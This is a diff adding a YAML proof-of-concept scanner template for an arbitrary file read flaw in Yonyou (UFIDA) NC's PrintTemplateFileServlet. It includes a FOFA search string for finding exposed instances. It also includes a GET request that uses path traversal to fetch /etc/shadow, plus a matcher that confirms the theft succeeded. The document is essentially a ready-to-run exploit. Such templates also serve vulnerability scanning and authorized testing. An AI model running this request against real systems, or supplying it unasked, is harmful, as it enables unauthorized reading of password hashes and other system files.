@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-nc-printtemplatefileservlet-anyfile-read
+info:
+  name: 用友NC PrintTemplateFileServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /servlet/~uapweb/nc.lfw.billtemplate.servlet.PrintTemplateFileServlet?filePath=../../../etc/shadow
+  expression: "status_code == 200 && \ncontains(body,\"root:\") && \ncontains(body,\"\
+    bin\") &&\ncontains(headers,\"application/pdf\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
